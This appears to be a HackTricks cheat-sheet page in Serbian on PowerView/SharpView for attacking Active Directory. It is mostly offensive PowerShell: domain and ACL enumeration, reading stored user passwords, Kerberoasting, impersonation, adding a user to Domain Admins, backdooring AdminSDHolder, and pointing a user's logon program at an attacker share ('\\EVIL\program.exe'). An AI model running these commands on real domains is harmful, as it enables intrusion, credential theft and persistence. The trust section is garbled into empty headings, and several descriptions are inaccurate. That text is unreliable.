# PowerView/SharpView

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? ≈Ωelite li da vidite **va≈°u kompaniju reklamiranu na HackTricks-u**? Ili ≈æelite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridru≈æite se** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** üê¶[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Najnovija verzija PowerView-a uvek ƒáe biti u dev grani PowerSploit-a: [https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

[**SharpView**](https://github.com/tevora-threat/SharpView) je .NET port [**PowerView-a**](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

### Brza enumeracija

```powershell
Get-NetDomain #Basic domain info
#User info
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount #Basic user enabled info
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN #Kerberoastable users
#Groups info
Get-NetGroup | select samaccountname, admincount, description
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=EGOTISTICAL-BANK,DC=local' | %{ $_.SecurityIdentifier } | Convert-SidToName #Get AdminSDHolders
#Computers
Get-NetComputer | select samaccountname, operatingsystem
Get-NetComputer -Unconstrainusered | select samaccountname #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth | select samaccountname #Find computers with Constrained Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups
#Shares
Find-DomainShare -CheckShareAccess #Search readable shares
#Domain trusts
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
#LHF
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess
#Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts.
Invoke-UserHunter -CheckAccess
#Find interesting ACLs
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | fl
```

### Informacije o domenu

#### Get-Domain

```
Get-Domain
```

Ova komanda prikazuje informacije o trenutnom domenu, ukljuƒçujuƒái ime domena, SID (Security Identifier), funkcionalnu razinu domena, broj kontrolera domena i druge relevantne informacije.

#### Get-DomainController

```
Get-DomainController
```

Ova komanda prikazuje informacije o kontrolerima domena, ukljuƒçujuƒái ime, IP adresu, operativni sistem, verziju i druge relevantne informacije.

#### Get-DomainPolicy

```
Get-DomainPolicy
```

Ova komanda prikazuje informacije o grupnim politikama domena, ukljuƒçujuƒái naziv politike, primijenjene postavke i druge relevantne informacije.

#### Get-DomainTrust

```
Get-DomainTrust
```

Ova komanda prikazuje informacije o povjerenju izmeƒëu domena, ukljuƒçujuƒái naziv domena, tip povjerenja i druge relevantne informacije.

#### Get-DomainUser

```
Get-DomainUser
```

Ova komanda prikazuje informacije o korisnicima domena, ukljuƒçujuƒái korisniƒçko ime, SID, grupne ƒçlanstva i druge relevantne informacije.

```powershell
# Domain Info
Get-Domain #Get info about the current domain
Get-NetDomain #Get info about the current domain
Get-NetDomain -Domain mydomain.local
Get-DomainSID #Get domain SID

# Policy
Get-DomainPolicy #Get info about the policy
(Get-DomainPolicy)."KerberosPolicy" #Kerberos tickets info(MaxServiceAge)
(Get-DomainPolicy)."SystemAccess" #Password policy
Get-DomainPolicyData | select -ExpandProperty SystemAccess #Same as previous
(Get-DomainPolicy).PrivilegeRights #Check your privileges
Get-DomainPolicyData # Same as Get-DomainPolicy

# Domain Controller
Get-DomainController | select Forest, Domain, IPAddress, Name, OSVersion | fl # Get specific info of current domain controller
Get-NetDomainController -Domain mydomain.local #Get all ifo of specific domain Domain Controller

# Get Forest info
Get-ForestDomain
```

### Korisnici, Grupe, Raƒçunari i OU

#### Get-NetUser

Koristite `Get-NetUser` komandu da biste dobili informacije o korisnicima u domenu. Ova komanda prikazuje korisniƒçka imena, SID-ove, domene, lozinke i druge relevantne informacije.

```powershell
Get-NetUser
```

#### Get-NetGroup

Koristite `Get-NetGroup` komandu da biste dobili informacije o grupama u domenu. Ova komanda prikazuje nazive grupa, SID-ove, domene i druge relevantne informacije.

```powershell
Get-NetGroup
```

#### Get-NetComputer

Koristite `Get-NetComputer` komandu da biste dobili informacije o raƒçunarima u domenu. Ova komanda prikazuje nazive raƒçunara, SID-ove, domene i druge relevantne informacije.

```powershell
Get-NetComputer
```

#### Get-NetOU

Koristite `Get-NetOU` komandu da biste dobili informacije o Organizacionim jedinicama (OU) u domenu. Ova komanda prikazuje nazive OU, SID-ove, domene i druge relevantne informacije.

```powershell
Get-NetOU
```

#### Get-DomainUser

Koristite `Get-DomainUser` komandu da biste dobili informacije o korisnicima u domenu. Ova komanda prikazuje korisniƒçka imena, SID-ove, domene, lozinke i druge relevantne informacije.

```powershell
Get-DomainUser
```

#### Get-DomainGroup

Koristite `Get-DomainGroup` komandu da biste dobili informacije o grupama u domenu. Ova komanda prikazuje nazive grupa, SID-ove, domene i druge relevantne informacije.

```powershell
Get-DomainGroup
```

#### Get-DomainComputer

Koristite `Get-DomainComputer` komandu da biste dobili informacije o raƒçunarima u domenu. Ova komanda prikazuje nazive raƒçunara, SID-ove, domene i druge relevantne informacije.

```powershell
Get-DomainComputer
```

#### Get-DomainOU

Koristite `Get-DomainOU` komandu da biste dobili informacije o Organizacionim jedinicama (OU) u domenu. Ova komanda prikazuje nazive OU, SID-ove, domene i druge relevantne informacije.

```powershell
Get-DomainOU
```

```powershell
# Users
## Get usernames and their groups
Get-DomainUser -Properties name, MemberOf | fl
## Get-DomainUser and Get-NetUser are kind of the same
Get-NetUser #Get users with several (not all) properties
Get-NetUser | select samaccountname, description, pwdlastset, logoncount, badpwdcount #List all usernames
Get-NetUser -UserName student107 #Get info about a user
Get-NetUser -properties name, description #Get all descriptions
Get-NetUser -properties name, pwdlastset, logoncount, badpwdcount  #Get all pwdlastset, logoncount and badpwdcount
Find-UserField -SearchField Description -SearchTerm "built" #Search account with "something" in a parameter
# Get users with reversible encryption (PWD in clear text with dcsync)
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

# Users Filters
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -properties distinguishedname #All enabled users
Get-NetUser -UACFilter ACCOUNTDISABLE #All disabled users
Get-NetUser -UACFilter SMARTCARD_REQUIRED #Users that require a smart card
Get-NetUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname #Not smart card users
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
Get-Netuser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto #Constrained Resource Delegation
Get-NetUser -AllowDelegation -AdminCount #All privileged users that aren't marked as sensitive/not for delegation
# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-ObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}
# Users with PASSWD_NOTREQD set in the userAccountControl means that the user is not subject to the current password policy
## Users with this flag might have empty passwords (if allowed) or shorter passwords
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

#Groups
Get-DomainGroup | where Name -like "*Admin*" | select SamAccountName
## Get-DomainGroup is similar to Get-NetGroup
Get-NetGroup #Get groups
Get-NetGroup -Domain mydomain.local #Get groups of an specific domain
Get-NetGroup 'Domain Admins' #Get all data of a group
Get-NetGroup -AdminCount | select name,memberof,admincount,member | fl #Search admin grups
Get-NetGroup -UserName "myusername" #Get groups of a user
Get-NetGroupMember -Identity "Administrators" -Recurse #Get users inside "Administrators" group. If there are groups inside of this grup, the -Recurse option will print the users inside the others groups also
Get-NetGroupMember -Identity "Enterprise Admins" -Domain mydomain.local #Remember that "Enterprise Admins" group only exists in the rootdomain of the forest
Get-NetLocalGroup -ComputerName dc.mydomain.local -ListGroups #Get Local groups of a machine (you need admin rights in no DC hosts)
Get-NetLocalGroupMember -computername dcorp-dc.dollarcorp.moneycorp.local #Get users of localgroups in computer
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs #Check AdminSDHolder users
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} #Get ObjectACLs by sid
Get-NetGPOGroup #Get restricted groups

# Computers
Get-DomainComputer -Properties DnsHostName # Get all domain maes of computers
## Get-DomainComputer is kind of the same as Get-NetComputer
Get-NetComputer #Get all computer objects
Get-NetComputer -Ping #Send a ping to check if the computers are working
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth #Find computers with Constrined Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups

#OU
Get-DomainOU -Properties Name | sort -Property Name #Get names of OUs
Get-DomainOU "Servers" | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties Name} #Get all computers inside an OU (Servers in this case)
## Get-DomainOU is kind of the same as Get-NetOU
Get-NetOU #Get Organization Units
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_} #Get all computers inside an OU (StudentMachines in this case)
```

### Prijavljivanje i sesije

PowerView pru≈æa nekoliko funkcija koje se mogu koristiti za prijavljivanje i upravljanje sesijama na ciljnom Windows sistemu.

#### Get-NetLoggedon

Komanda `Get-NetLoggedon` prikazuje informacije o korisnicima koji su trenutno prijavljeni na ciljnom sistemu. Ova komanda mo≈æe biti korisna za identifikaciju aktivnih sesija i potencijalnih metoda napada.

#### Get-NetSession

Komanda `Get-NetSession` prikazuje informacije o aktivnim sesijama na ciljnom sistemu. Ova komanda mo≈æe biti korisna za identifikaciju otvorenih sesija i pristupa resursima.

#### Get-NetRDPSession

Komanda `Get-NetRDPSession` prikazuje informacije o aktivnim RDP sesijama na ciljnom sistemu. Ova komanda mo≈æe biti korisna za identifikaciju udaljenih sesija i potencijalnih metoda napada.

#### Get-NetProcess

Komanda `Get-NetProcess` prikazuje informacije o procesima koji se izvr≈°avaju na ciljnom sistemu. Ova komanda mo≈æe biti korisna za identifikaciju aktivnih procesa i potencijalnih taƒçaka napada.

#### Get-NetProcessOwner

Komanda `Get-NetProcessOwner` prikazuje informacije o vlasnicima procesa na ciljnom sistemu. Ova komanda mo≈æe biti korisna za identifikaciju privilegija vlasnika procesa i potencijalnih taƒçaka napada.

#### Get-NetLoggedon -HostName

Komanda `Get-NetLoggedon -HostName` prikazuje informacije o korisnicima koji su prijavljeni na odreƒëeni host na ciljnom sistemu. Ova komanda mo≈æe biti korisna za identifikaciju aktivnih sesija na odreƒëenom hostu.

#### Get-NetSession -HostName

Komanda `Get-NetSession -HostName` prikazuje informacije o aktivnim sesijama na odreƒëenom hostu na ciljnom sistemu. Ova komanda mo≈æe biti korisna za identifikaciju otvorenih sesija na odreƒëenom hostu.

#### Get-NetRDPSession -HostName

Komanda `Get-NetRDPSession -HostName` prikazuje informacije o aktivnim RDP sesijama na odreƒëenom hostu na ciljnom sistemu. Ova komanda mo≈æe biti korisna za identifikaciju udaljenih sesija na odreƒëenom hostu.

#### Get-NetProcess -HostName

Komanda `Get-NetProcess -HostName` prikazuje informacije o procesima koji se izvr≈°avaju na odreƒëenom hostu na ciljnom sistemu. Ova komanda mo≈æe biti korisna za identifikaciju aktivnih procesa na odreƒëenom hostu.

#### Get-NetProcessOwner -HostName

Komanda `Get-NetProcessOwner -HostName` prikazuje informacije o vlasnicima procesa na odreƒëenom hostu na ciljnom sistemu. Ova komanda mo≈æe biti korisna za identifikaciju privilegija vlasnika procesa na odreƒëenom hostu.

```powershell
Get-NetLoggedon -ComputerName <servername> #Get net logon users at the moment in a computer (need admins rights on target)
Get-NetSession -ComputerName <servername> #Get active sessions on the host
Get-LoggedOnLocal -ComputerName <servername> #Get locally logon users at the moment (need remote registry (default in server OS))
Get-LastLoggedon -ComputerName <servername> #Get last user logged on (needs admin rigths in host)
Get-NetRDPSession -ComputerName <servername> #List RDP sessions inside a host (needs admin rights in host)
```

### Group Policy Object - GPOs

Ako napadaƒç ima **visoke privilegije nad GPO-om**, mogao bi iskoristiti to za **privesc** tako ≈°to ƒáe **dodati dozvole korisniku**, **dodati lokalnog admin korisnika** na raƒçunar ili **kreirati zakazani zadatak** (odmah) za izvr≈°avanje odreƒëene radnje.\
Za [**vi≈°e informacija o tome i kako to iskoristiti, pratite ovaj link**](../active-directory-methodology/acl-persistence-abuse/#gpo-delegation).

```powershell
#GPO
Get-DomainGPO | select displayName #Check the names for info
Get-NetGPO #Get all policies with details
Get-NetGPO | select displayname #Get the names of the policies
Get-NetGPO -ComputerName <servername> #Get the policy applied in a computer
gpresult /V #Get current policy

# Get who can create new GPOs
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=invented,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# Enumerate permissions for GPOs where users with RIDs of > 1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')} | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# Get permissions a user/group has over any GPO
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

# COnvert GPO GUID to name
Get-GPO -Guid 18E5A689-E67F-90B2-1953-198ED4A7F532

# Transform SID to name
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1126

# Get GPO of an OU
Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}'

# Returns all GPOs that modify local group memberships through Restricted Groups or Group Policy Preferences.
Get-DomainGPOLocalGroup | select GPODisplayName, GroupName, GPOType

# Enumerates the machines where a specific domain user/group is a member of a specific local group.
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName
```

Nauƒçite kako **iskoristiti dozvole nad GPO-ovima i ACL-ovima** u:

{% content-ref url="../active-directory-methodology/acl-persistence-abuse/" %}
[acl-persistence-abuse](../active-directory-methodology/acl-persistence-abuse/)
{% endcontent-ref %}

### ACL

```powershell
#Get ACLs of an object (permissions of other objects over the indicated one)
Get-ObjectAcl -SamAccountName <username> -ResolveGUIDs

#Other way to get ACLs of an object
$sid = Convert-NameToSid <username/group>
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

#Get permissions of a file
Get-PathAcl -Path "\\dc.mydomain.local\sysvol"

#Find intresting ACEs (Interesting permisions of "unexpected objects" (RID>1000 and modify permissions) over other objects
Find-InterestingDomainAcl -ResolveGUIDs

#Check if any of the interesting permissions founds is realated to a username/group
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}

#Get special rights over All administrators in domain
Get-NetGroupMember -GroupName "Administrators" -Recurse | ?{$_.IsGroup -match "false"} | %{Get-ObjectACL -SamAccountName $_.MemberName -ResolveGUIDs} | select ObjectDN, IdentityReference, ActiveDirectoryRights
```

### Deljeni fajlovi i folderi

PowerView provides several functions to enumerate shared files and folders on a Windows system. These functions can be useful for a pentester to identify potential points of vulnerability or to gather information about the target network.

#### Get-NetShare

The `Get-NetShare` function retrieves information about shared folders on the target system. It returns details such as the name of the share, the local path, and the permissions associated with the share.

```powershell
Get-NetShare
```

#### Get-NetFileServer

The `Get-NetFileServer` function enumerates file servers on the target network. It provides information about the file servers, including their names and the shares they host.

```powershell
Get-NetFileServer
```

#### Get-NetFileShare

The `Get-NetFileShare` function retrieves information about file shares on the target system. It returns details such as the name of the share, the local path, and the permissions associated with the share.

```powershell
Get-NetFileShare
```

#### Get-NetSession

The `Get-NetSession` function lists active sessions on the target system. It provides information about the users who are currently connected to shared resources, such as files or printers.

```powershell
Get-NetSession
```

#### Get-NetLoggedon

The `Get-NetLoggedon` function enumerates users who are currently logged on to the target system. It returns details such as the username, logon time, and the domain to which the user belongs.

```powershell
Get-NetLoggedon
```

By using these PowerView functions, a pentester can gain valuable insights into the shared files and folders on a Windows system, allowing for further analysis and potential exploitation.

```powershell
Get-NetFileServer #Search file servers. Lot of users use to be logged in this kind of servers
Find-DomainShare -CheckShareAccess #Search readable shares
Find-InterestingDomainShareFile #Find interesting files, can use filters
```

### Poverenje domena

***

#### Trust Types

**Tipovi poverenja**

***

#### Trust Enumeration

**Enumeracija poverenja**

***

#### Trust Relationships

**Veze poverenja**

***

#### Trust Permissions

**Dozvole poverenja**

***

#### Trust Creation

**Kreiranje poverenja**

***

#### Trust Delegation

**Delegiranje poverenja**

***

#### Trust Removal

**Uklanjanje poverenja**

***

#### Trust Manipulation

**Manipulacija poverenjem**

***

#### Trust Exploitation

**Eksploatacija poverenja**

***

#### Trust Misconfiguration

**Pogre≈°na konfiguracija poverenja**

***

#### Trust Enumeration Tools

**Alati za enumeraciju poverenja**

***

#### Trust Exploitation Tools

**Alati za eksploataciju poverenja**

***

#### Trust Misconfiguration Tools

**Alati za pogre≈°nu konfiguraciju poverenja**

***

#### Trust Defense

**Odbrana od poverenja**

***

#### Trust Monitoring

**Praƒáenje poverenja**

***

#### Trust Recommendations

**Preporuke za poverenje**

```powershell
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-DomainTrust #Same
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
Get-DomainTrustMapping #Enumerate also all the trusts

Get-ForestDomain # Get basic forest info
Get-ForestGlobalCatalog #Get info of current forest (no external)
Get-ForestGlobalCatalog -Forest external.domain #Get info about the external forest (if possible)
Get-DomainTrust -SearchBase "GC://$($ENV:USERDNSDOMAIN)"

Get-NetForestTrust #Get forest trusts (it must be between 2 roots, trust between a child and a root is just an external trust)

Get-DomainForeingUser #Get users with privileges in other domains inside the forest
Get-DomainForeignGroupMember #Get groups with privileges in other domains inside the forest
```

### Nisko-ve≈°anje voƒáa

Nisko-ve≈°anje voƒáa se odnosi na ranjive taƒçke ili slabosti koje su lako dostupne i mogu biti iskori≈°ƒáene od strane napadaƒça. Ove ranjivosti su ƒçesto jednostavne za iskori≈°ƒáavanje i mogu biti prvi korak u napadu na sistem.

```powershell
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl

#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess

#(This time you need to give the list of computers in the domain) Do the same as before but trying to execute a WMI action in each computer (admin privs are needed to do so). Useful if RCP and SMB ports are closed.
.\Find-WMILocalAdminAccess.ps1 -ComputerFile .\computers.txt

#Enumerate machines where a particular user/group identity has local admin rights
Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>

# Enumerates the members of specified local group (default administrators)
# for all the targeted machines on the current (or specified) domain.
Invoke-EnumerateLocalAdmin
Find-DomainLocalGroupMember

#Search unconstrained delegation computers and show users
Find-DomainUserLocation -ComputerUnconstrained -ShowAll

#Admin users that allow delegation, logged into servers that allow unconstrained delegation
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation

#Get members from Domain Admins (default) and a list of computers
# and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host.
# If -Checkaccess, then it also check for LocalAdmin access in the hosts.
## By default users inside Domain Admins are searched
Find-DomainUserLocation [-CheckAccess] | select UserName, SessionFromName
Invoke-UserHunter [-CheckAccess]

#Search "RDPUsers" users
Invoke-UserHunter -GroupName "RDPUsers"

#It will only search for active users inside high traffic servers (DC, File Servers and Distributed File servers)
Invoke-UserHunter -Stealth
```

### Obrisani objekti

Kada se objekti obri≈°u u Active Directory-u, oni se ne uklanjaju odmah iz baze podataka. Umesto toga, oni se oznaƒçavaju kao obrisani i preme≈°taju se u poseban deo baze podataka koji se naziva "Smeƒáe". Ovi obrisani objekti mogu sadr≈æati korisne informacije za napadaƒçe, kao ≈°to su lozinke ili privilegije. Powerview pru≈æa nekoliko funkcija koje omoguƒáavaju pristup i manipulaciju ovim obrisanim objektima.

#### Get-DomainDeletedObject

Ova funkcija se koristi za prikupljanje informacija o obrisanim objektima u domenu. Mo≈æe se koristiti sledeƒáom komandom:

```powershell
Get-DomainDeletedObject
```

Ova komanda ƒáe prikazati sve obrisane objekte u domenu, ukljuƒçujuƒái njihove nazive, tipove objekata i vreme kada su obrisani.

#### Restore-DomainDeletedObject

Ova funkcija se koristi za vraƒáanje obrisanih objekata u domenu. Mo≈æe se koristiti sledeƒáom komandom:

```powershell
Restore-DomainDeletedObject -SamAccountName <ime_objekta>
```

Zamijenite `<ime_objekta>` sa ≈æeljenim imenom obrisanih objekata koje ≈æelite da vratite. Ova komanda ƒáe vratiti obrisani objekat u domenu.

#### Remove-DomainDeletedObject

Ova funkcija se koristi za trajno uklanjanje obrisanih objekata iz smeƒáa. Mo≈æe se koristiti sledeƒáom komandom:

```powershell
Remove-DomainDeletedObject -SamAccountName <ime_objekta>
```

Zamijenite `<ime_objekta>` sa ≈æeljenim imenom obrisanih objekata koje ≈æelite trajno ukloniti. Ova komanda ƒáe trajno ukloniti obrisani objekat iz smeƒáa.

```powershell
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the AD Recycle Bin group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

### RAZNO

#### SID u Ime

```powershell
"S-1-5-21-1874506631-3219952063-538504511-2136" | Convert-SidToName
```

#### Kerberoast

Kerberoast je tehnika koja omoguƒáava napadaƒçu da izvuƒçe hash-ove lozinki korisnika koji koriste uslugu Kerberos. Ova tehnika se zasniva na slabosti u naƒçinu na koji se generi≈°u hash-ovi lozinki za uslugu Kerberos.

Da bi se izvr≈°io napad Kerberoast, napadaƒç mora imati privilegije da pristupi usluzi Kerberos i da izvr≈°i zahtev za generisanje hash-a lozinke za odreƒëenog korisnika. Nakon ≈°to napadaƒç dobije hash lozinke, mo≈æe ga de≈°ifrovati i dobiti praviu lozinku korisnika.

Ova tehnika je posebno korisna za napadaƒçe koji ≈æele da napadnu korisnike sa jakim lozinkama, jer se hash lozinke mo≈æe de≈°ifrovati offline, bez potrebe za pristupom korisniƒçkom nalogu.

Da bi se izvr≈°io napad Kerberoast, mo≈æete koristiti alat PowerView u PowerShell-u. PowerView pru≈æa niz funkcija koje olak≈°avaju izvr≈°avanje ovog napada.

Evo nekoliko koraka koje mo≈æete slediti da biste izvr≈°ili napad Kerberoast koristeƒái PowerView:

1. Pokrenite PowerShell kao administrator.
2. Uƒçitajte PowerView modul komandom `Import-Module PowerView`.
3. Izvr≈°ite komandu `Get-DomainUser -SPN` da biste dobili listu korisnika koji koriste uslugu Kerberos.
4. Izvr≈°ite komandu `Invoke-Kerberoast` da biste generisali hash-ove lozinki za odabrane korisnike.
5. De≈°ifrujte hash-ove lozinki koristeƒái alat kao ≈°to je Hashcat.

Napomena: Napad Kerberoast mo≈æe biti ilegalan ako se izvodi bez odobrenja vlasnika sistema. Uvek se pridr≈æavajte zakona i etiƒçkih smernica prilikom izvr≈°avanja ovih tehnika.

```powershell
Invoke-Kerberoast [-Identity websvc] #Without "-Identity" kerberoast all possible users
```

#### Koristite razliƒçite akreditive (argument)

Kada koristite PowerView, mo≈æete specificirati razliƒçite akreditive za izvr≈°avanje operacija. To se posti≈æe kori≈°ƒáenjem argumenta `-Credential` prilikom pokretanja funkcija. Na taj naƒçin mo≈æete izvr≈°avati operacije sa privilegijama drugog korisnika ili ƒçak sa privilegijama administratorskog naloga.

Na primer, mo≈æete koristiti sledeƒáu sintaksu za pokretanje funkcije `Get-DomainUser` sa drugim akreditivima:

```powershell
Get-DomainUser -Credential (Get-Credential)
```

Ova komanda ƒáe otvoriti dijalog za unos korisniƒçkog imena i lozinke. Nakon unosa, funkcija `Get-DomainUser` ƒáe biti izvr≈°ena sa unetim akreditivima umesto trenutno prijavljenog korisnika.

```powershell
# use an alterate creadential for any function
$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUser -Credential $Cred
```

#### Impersoniraj korisnika

```powershell
Invoke-UserImpersonation -Username <username>
```

Ova komanda omoguƒáava da se impersonira odreƒëeni korisnik. Potrebno je navesti korisniƒçko ime `<username>` koje ≈æelite da impersonirate.

```powershell
# if running in -sta mode, impersonate another credential a la "runas /netonly"
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
# ... action
Invoke-RevertToSelf
```

#### Postavi vrednosti

```powershell
Set-Value
```

Ova funkcija se koristi za postavljanje vrednosti u registru. Mo≈æe se koristiti za postavljanje vrednosti u bilo kojem kljuƒçu registra, ukljuƒçujuƒái i kljuƒçeve koji su za≈°tiƒáeni od promene.

```powershell
# set the specified property for the given user identity
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose
# Set the owner of 'dfm' in the current domain to 'harmj0y'
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y
# Backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
# Add user to 'Domain Admins'
Add-NetGroupUser -Username username -GroupName 'Domain Admins' -Domain my.domain.local
```

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? ≈Ωelite li da vidite svoju **kompaniju reklamiranu na HackTricks-u**? Ili ≈æelite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridru≈æite se** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** üê¶[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
